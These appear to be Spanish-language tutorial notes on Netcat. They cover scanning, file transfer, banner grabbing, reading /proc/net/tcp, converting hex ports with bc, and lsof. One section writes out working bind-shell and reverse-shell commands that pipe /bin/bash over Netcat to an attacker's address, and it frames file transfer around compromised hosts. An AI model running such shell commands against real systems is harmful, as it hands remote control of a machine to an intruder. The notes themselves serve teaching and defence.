# Netcat y Conexiones de Red

## Qué es Netcat y por qué se la conoce como "la navaja suiza del TCP/IP"

Netcat es una herramienta de línea de comandos, originaria del mundo Unix a mediados de la década de 1990 y expandida desde entonces a prácticamente cualquier plataforma, cuyo propósito fundamental es leer y escribir datos directamente sobre una conexión de red, utilizando indistintamente los protocolos TCP o UDP. Su diseño es deliberadamente minimalista: en esencia, Netcat toma lo que recibe por su entrada estándar y lo envía por la red, y toma lo que recibe por la red y lo entrega a la salida estándar, comportándose de forma muy similar a como lo haría `cat` con un archivo, pero sustituyendo ese archivo por una conexión de red.

Esta simplicidad de diseño es, paradójicamente, la razón de su enorme versatilidad y de que se la conozca popularmente como "la navaja suiza del TCP/IP": al operar sobre el concepto más básico posible (flujo de bytes entrando y saliendo de una conexión), Netcat puede combinarse con cualquier otra herramienta del sistema mediante pipes para construir un abanico enorme de funcionalidades distintas sin que ninguna de ellas esté programada explícitamente dentro de la propia herramienta. Entre sus usos más habituales se encuentran el diagnóstico de problemas de red y de disponibilidad de servicios, el escaneo básico de puertos, la transferencia de archivos entre dos máquinas, el establecimiento de sesiones de chat rudimentarias, la obtención de banners de servicios para identificar versiones de software expuestas, y, en el terreno ofensivo de la ciberseguridad, la creación de shells reversas y bind shells durante ejercicios de explotación y post-explotación.

Netcat puede operar en dos modos complementarios: modo servidor (también llamado modo de escucha, activado con la opción `-l`, de _listen_), en el cual Netcat se queda esperando pasivamente a que alguien se conecte a un puerto determinado de la máquina donde se ejecuta, y modo cliente, en el cual Netcat inicia activamente una conexión hacia un host y puerto remotos. Esta dualidad de modos, combinada con la posibilidad de canalizar la entrada y salida de Netcat hacia y desde cualquier otro programa del sistema (incluyendo, de forma crítica desde el punto de vista de la seguridad, un intérprete de shell), es lo que la convierte en una herramienta tan citada dentro del ámbito de la ciberseguridad ofensiva.

```bash
# Modo servidor: Netcat se queda escuchando en el puerto 4444,
# esperando que alguien se conecte
nc -lvnp 4444

# Modo cliente: Netcat inicia una conexión hacia un host y puerto remotos
nc 192.168.1.10 4444
```

Las opciones más utilizadas en la práctica son `-l` (modo escucha), `-v` (modo detallado o _verbose_, mostrando información adicional sobre la conexión), `-n` (evita realizar resoluciones DNS, tratando siempre las direcciones como IPs numéricas, lo cual acelera la ejecución y evita fugas de tráfico DNS hacia servidores no deseados) y `-p` (especifica explícitamente el puerto local a utilizar en modo escucha).

## Escaneo básico de puertos con Netcat

Aunque existen herramientas mucho más completas y sofisticadas para el escaneo de puertos, como `nmap`, Netcat puede utilizarse para realizar un escaneo TCP muy básico, útil en escenarios donde no se dispone de herramientas más avanzadas en el sistema.

```bash
# Escanea un rango de puertos TCP en un host determinado,
# mostrando únicamente los que responden (-z indica "zero-I/O
# mode", es decir, no enviar datos, solo comprobar la conexión)
nc -zv 192.168.1.10 20-100

# Escaneo equivalente sobre UDP, considerablemente menos fiable
# que el escaneo TCP debido a la propia naturaleza del protocolo
nc -zuv 192.168.1.10 53
```

## Transferencia de archivos y banner grabbing

Aprovechando su capacidad de leer y escribir flujos de datos crudos, Netcat puede utilizarse para transferir archivos entre dos máquinas sin depender de un servidor FTP, HTTP o SSH previamente configurado, algo particularmente útil durante un ejercicio de post-explotación cuando se necesita mover una herramienta hacia un sistema comprometido que carece de acceso directo a internet o de utilidades de descarga instaladas.

```bash
# En la máquina RECEPTORA, Netcat escucha en un puerto
# y redirige todo lo que reciba hacia un archivo
nc -lvnp 4444 > archivo_recibido.txt

# En la máquina EMISORA, Netcat se conecta y envía
# el contenido de un archivo a través de la conexión
nc 192.168.1.10 4444 < archivo_a_enviar.txt
```

Otro uso habitual, especialmente en la fase de reconocimiento de un pentest, es el _banner grabbing_: conectarse manualmente a un puerto abierto para observar el mensaje de bienvenida (_banner_) que el servicio en escucha envía nada más establecerse la conexión, el cual frecuentemente revela información sobre el software y la versión exacta que está corriendo detrás de ese puerto.

```bash
# Se conecta al puerto 22 (SSH) y muestra el banner
# de versión que el servicio anuncia automáticamente
nc -v 192.168.1.10 22
# Connection to 192.168.1.10 22 port [tcp/ssh] succeeded!
# SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13
```

## Netcat en el contexto ofensivo: shells reversas y bind shells

El uso de Netcat que más relevancia tiene dentro de un contexto de ciberseguridad ofensiva es su capacidad de encadenar su entrada y salida directamente con un intérprete de comandos, dando lugar a dos patrones de conexión ampliamente utilizados durante la explotación de vulnerabilidades: la bind shell y la shell reversa (_reverse shell_).

En una **bind shell**, la máquina comprometida (la víctima) ejecuta Netcat en modo escucha, vinculando un puerto a un intérprete de shell, de modo que cualquiera que se conecte a ese puerto obtiene directamente una sesión de línea de comandos sobre la máquina comprometida. Este enfoque tiene la desventaja de que requiere que la máquina víctima sea alcanzable directamente desde la máquina atacante, algo que en redes reales suele estar bloqueado por firewalls o NAT en el lado de la víctima.

```bash
# En la máquina VÍCTIMA (tras haber logrado ejecución de comandos
# mediante alguna vulnerabilidad), se abre una bind shell,
# vinculando el puerto 4444 directamente a /bin/bash
nc -lvnp 4444 -e /bin/bash

# Desde la máquina ATACANTE, basta con conectarse a ese puerto
# para obtener una shell interactiva sobre la máquina víctima
nc 192.168.1.50 4444
```

En una **shell reversa**, el patrón se invierte: es la máquina atacante la que se pone en modo escucha, y es la máquina víctima la que inicia activamente la conexión hacia el atacante, entregándole una shell interactiva. Este enfoque es, en la práctica, mucho más habitual que la bind shell, precisamente porque las conexiones salientes desde la red de la víctima suelen estar mucho menos restringidas por firewalls que las conexiones entrantes, lo cual permite sortear buena parte de las restricciones perimetrales típicas de una red corporativa.

```bash
# En la máquina ATACANTE, se pone Netcat en modo escucha,
# esperando a que la víctima se conecte
nc -lvnp 4444

# En la máquina VÍCTIMA, se ejecuta un comando que inicia
# una conexión saliente hacia el atacante y le entrega
# una shell interactiva a través de ella
nc 192.168.1.100 4444 -e /bin/bash
```

> **Nota de seguridad:** muchas versiones modernas de Netcat (particularmente la variante OpenBSD, incluida por defecto en Debian/Ubuntu desde hace años) han eliminado deliberadamente la opción `-e` precisamente por su potencial de abuso en este tipo de escenarios, lo cual obliga en la práctica a recurrir a construcciones alternativas basadas en redirección de descriptores de archivo y FIFOs (colas con nombre) para lograr el mismo resultado sin depender de esa opción, un patrón muy citado en materiales de explotación pero que excede el alcance de estas notas introductorias. Desde la perspectiva defensiva, la capacidad de Netcat (y de utilidades equivalentes) para entregar shells interactivas es uno de los motivos por los que se recomienda restringir estrictamente las conexiones salientes desde servidores de producción mediante reglas de firewall explícitas (_egress filtering_), en lugar de asumir que solo las conexiones entrantes representan un riesgo.

## Listado de puertos abiertos en la máquina local

Antes de establecer o diagnosticar conexiones con Netcat, resulta habitual necesitar conocer qué puertos están actualmente abiertos y en escucha en la propia máquina, información que puede obtenerse mediante varias herramientas del sistema, cada una con un enfoque ligeramente distinto.

```bash
# netstat -s muestra estadísticas de red por protocolo
# (paquetes enviados/recibidos, errores, retransmisiones, etc.),
# útil para diagnóstico general, aunque no es la forma más directa
# de listar puertos concretos en escucha
netstat -s

# ss (socket statistics) es la herramienta moderna que sustituye
# a netstat en la mayoría de distribuciones actuales, siendo
# considerablemente más rápida al obtener su información
# directamente del kernel en lugar de recorrer /proc de forma
# menos eficiente. Las opciones combinadas más útiles son:
#   -n: no resuelve nombres de servicio (más rápido, muestra
#       números de puerto en lugar de nombres como "ssh")
#   -l: muestra únicamente sockets en estado de escucha (listening)
#   -t: filtra únicamente conexiones TCP
#   -p: muestra el proceso (PID y nombre) propietario de cada socket
ss -nltp
```

Una tercera vía, más de bajo nivel, consiste en leer directamente `/proc/net/tcp`, un archivo virtual expuesto por el propio kernel (dentro del sistema de archivos virtual `/proc` visto en apuntes anteriores) que contiene una tabla con el estado interno de todas las conexiones TCP activas en el sistema en este preciso momento.

```bash
cat /proc/net/tcp
```

La salida de este archivo tiene un formato compacto y poco amigable a simple vista, en el que cada línea representa una conexión o socket, y cada columna contiene un dato codificado. La columna que más interesa para identificar puertos en escucha es la segunda, `local_address`, que contiene la dirección IP local y el puerto local de esa conexión, ambos expresados en hexadecimal y separados por dos puntos, con el formato `IP_EN_HEX:PUERTO_EN_HEX`. Por ejemplo, una entrada como `0100007F:B1E8` corresponde a la dirección `127.0.0.1` (localhost, expresada en hexadecimal y en orden de bytes invertido, propio de la representación interna del kernel) y al puerto `B1E8` en hexadecimal, que es precisamente el tipo de valor que aparece en el ejemplo de conversión de la siguiente sección.

## Conversión de puertos de hexadecimal a decimal

Dado que `/proc/net/tcp` expresa los números de puerto en hexadecimal, y las personas trabajamos habitualmente con puertos en su representación decimal más familiar (por ejemplo, `22` para SSH o `80` para HTTP), resulta necesario convertir estos valores. Bash no incluye de forma nativa una función de conversión de bases numéricas tan flexible como para resolver esto directamente con aritmética de enteros estándar, por lo que se recurre a `bc` (_basic calculator_), una calculadora de precisión arbitraria disponible en la línea de comandos que sí admite trabajar explícitamente con bases numéricas distintas mediante las variables internas `ibase` (base de entrada, _input base_) e `obase` (base de salida, _output base_).

```bash
# ibase=16 le indica a bc que el número que sigue debe
# interpretarse como si estuviera escrito en base 16 (hexadecimal).
# obase=10 le indica que el resultado debe expresarse en base 10
# (decimal). Es importante el orden: obase debe fijarse ANTES
# de leer el número si se quisiera cambiar también la base
# de lectura del propio obase, aunque en la práctica, al ser 10
# tanto en hexadecimal como en decimal el mismo símbolo, no
# supone un problema en este caso concreto
echo "obase=10; ibase=16; B1E8" | bc
# 45544
```

Para procesar automáticamente una lista completa de puertos en hexadecimal, en lugar de convertir cada uno manualmente, se recurre a un bucle `while read line`, un patrón extremadamente común en scripting de bash para procesar una entrada línea por línea. La construcción `while read line; do ... done` lee repetidamente una línea de la entrada estándar en cada iteración, almacenándola en la variable `line`, y continúa ejecutando el cuerpo del bucle hasta que no queden más líneas por leer (momento en el que `read` devuelve un valor de fallo y el bucle termina de forma natural, de manera conceptualmente similar a como el bucle del script de descompresión recursiva terminaba al quedarse sin más archivos que procesar).

```bash
# Lista de puertos en hexadecimal a convertir
echo ; echo "B1E8
B08F
98F3
9E50
EBFC" | sort -u | while read line; do
  echo "[+] Puerto $line --> $(echo "obase=10; ibase=16; $line" | bc) - OPEN"
done;
```

Desglosando este comando por partes: el primer `echo` vacío simplemente imprime una línea en blanco por estética, para separar visualmente la salida del propio prompt anterior. El segundo `echo`, con el bloque de texto entre comillas, genera la lista de puertos en hexadecimal como su salida, uno por línea. Esa salida se canaliza hacia `sort -u`, que además de ordenar las líneas alfabéticamente, elimina cualquier duplicado gracias a la opción `-u` (_unique_), asegurando que cada puerto se procese una única vez incluso si apareciera repetido varias veces en la lista original (por ejemplo, si el mismo puerto tuviera múltiples conexiones activas simultáneas). Finalmente, esa lista ya depurada se canaliza hacia el bucle `while read line`, que por cada línea recibida ejecuta la conversión de hexadecimal a decimal mediante `bc`, tal como se explicó anteriormente, y compone un mensaje legible indicando el puerto original en hexadecimal junto a su equivalente en decimal.

```
[+] Puerto 98F3 --> 39155 - OPEN
[+] Puerto 9E50 --> 40528 - OPEN
[+] Puerto B08F --> 45199 - OPEN
[+] Puerto B1E8 --> 45544 - OPEN
[+] Puerto EBFC --> 60412 - OPEN
```

Este tipo de conversión manual resulta especialmente relevante en escenarios donde no se dispone de herramientas de más alto nivel como `ss` o `netstat` (por ejemplo, en un sistema fuertemente restringido tras una explotación, donde solo se cuenta con acceso de lectura básico al sistema de archivos virtual `/proc`), y constituye un buen ejemplo de cómo combinar utilidades de propósito muy específico (`sort`, `while read`, `bc`) para resolver un problema que, a simple vista, parecería requerir un script más elaborado en un lenguaje de programación completo.

## Identificación del servicio detrás de un puerto abierto: lsof

Una vez identificado que un puerto determinado está abierto y en escucha, el siguiente paso lógico durante una auditoría o una investigación es determinar exactamente qué proceso del sistema es el responsable de esa escucha. Para esto resulta muy útil `lsof` (_list open files_), una utilidad que, siguiendo la filosofía Unix de que "todo es un archivo" (mencionada también al hablar del directorio `/dev`), permite listar no solo archivos regulares abiertos por los procesos del sistema, sino también sockets de red, ya que estos también se representan internamente como descriptores de archivo.

```bash
# Muestra qué proceso tiene abierto (en escucha o en conexión)
# el puerto indicado, en cualquier protocolo (TCP o UDP)
lsof -i:39155
```

```
COMMAND  PID   USER FD   TYPE DEVICE SIZE/OFF NODE NAME
code    2791 fnieto 62u  IPv4  24003      0t0  TCP localhost:39155 (LISTEN)
```

La salida de `lsof -i` es considerablemente más informativa que la de `/proc/net/tcp` en bruto, ya que traduce directamente el número de puerto a su contexto real: en este ejemplo concreto, revela que el puerto `39155` (que corresponde precisamente al valor `98F3` en hexadecimal, convertido en el ejemplo anterior) pertenece al proceso `code` (el editor Visual Studio Code, que abre puertos locales de este tipo para funcionalidades internas como su servidor de extensiones), ejecutándose con el `PID` `2791` bajo el usuario `fnieto`, en estado `LISTEN` sobre IPv4 y escuchando únicamente en `localhost`, lo cual indica que ese puerto no es alcanzable desde fuera de la propia máquina.

```bash
# Otras variantes útiles de lsof relacionadas con red:

# Filtra por un protocolo y puerto específicos
lsof -iTCP:22

# Muestra todas las conexiones de red activas del sistema,
# sin filtrar por ningún puerto concreto
lsof -i

# Filtra únicamente sockets en estado de escucha
lsof -i -sTCP:LISTEN

# Muestra qué archivos y sockets tiene abiertos un proceso concreto,
# identificado por su PID, útil tras haber localizado
# el proceso responsable de un puerto con lsof -i
lsof -p 2791
```

Desde una perspectiva de auditoría de seguridad, `lsof -i -sTCP:LISTEN` es un comando de referencia obligado al revisar la superficie de exposición de un sistema recién desplegado o durante una investigación de incidentes: permite responder de forma inmediata a la pregunta "¿qué está escuchando en esta máquina y quién es responsable de ello?", que es precisamente el primer paso para decidir si un puerto en escucha es un servicio legítimo y esperado, o si por el contrario corresponde a un proceso desconocido o sospechoso que amerita una investigación más profunda.
